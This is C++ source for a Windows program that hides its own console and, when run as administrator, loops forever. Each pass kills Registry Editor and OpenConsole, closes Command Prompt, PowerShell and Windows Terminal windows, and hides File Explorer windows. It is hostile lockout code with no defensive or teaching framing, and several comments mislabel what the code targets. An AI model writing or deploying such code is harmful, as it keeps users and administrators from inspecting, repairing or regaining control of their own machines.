#include <Windows.h>
#include <ShlObj.h>
#include <iostream>
#include <TlHelp32.h>
#include <psapi.h>

using namespace std;

void CloseCmdWindows() {
    HWND hwnd = FindWindowA("ConsoleWindowClass", NULL);
    while (hwnd != NULL) {
        DWORD pid;
        GetWindowThreadProcessId(hwnd, &pid);

        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
        if (hProcess) {
            char szProcessName[MAX_PATH] = { 0 };
            if (GetModuleFileNameExA(hProcess, NULL, szProcessName, sizeof(szProcessName) / sizeof(char))) {
                // Check for cmd.exe, Windows Terminal, PowerShell, and regedit
                if (strstr(szProcessName, "cmd.exe") != NULL || 
                    strstr(szProcessName, "wt.exe") != NULL || 
                    strstr(szProcessName, "powershell.exe") != NULL || 
                    strstr(szProcessName, "pwsh.exe") != NULL) {
                    PostMessage(hwnd, WM_CLOSE, 0, 0); // Send a close message to the window
                }
            }
            CloseHandle(hProcess);
        }
        hwnd = FindWindowExA(NULL, hwnd, "ConsoleWindowClass", NULL); // Find the next cmd window
    }
}

void CloseProcesses(const char* processName) {
    // Find the process ID of the specified process
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return;
    }

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe)) {
        do {
            if (strcmp(pe.szExeFile, processName) == 0) {
                // Open the process
                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                if (hProcess) {
                    // Terminate the process
                    TerminateProcess(hProcess, 0);
                    CloseHandle(hProcess);
                }
            }
        } while (Process32Next(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
}

int main()
{
    HWND Console;
    Console = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(Console, SW_HIDE); // Hide the console window

    if (IsUserAnAdmin()) {
        while (true) {
            HWND TaskMgr = FindWindowA("TaskManagerWindow", NULL); // Use the correct class name for Task Manager
            HWND explorer = FindWindowA("CabinetWClass", NULL); // Try finding the Regedit window with CabinetWClass
            
            // if (TaskMgr) {
            //     ShowWindow(TaskMgr, SW_HIDE); // Hide Task Manager
            // } 
            if (explorer) {
                ShowWindow(explorer, SW_HIDE); // Hide Regedit
            }

            CloseProcesses("regedit.exe");
            CloseProcesses("OpenConsole.exe");
            CloseCmdWindows();

            Sleep(250); // Sleep to reduce CPU usage
        }
    } else {
        ShowWindow(Console, SW_SHOW); // Show the console window
        cout << "You don't have admin rights" << endl;
        system("pause");
    }

    return 0;
}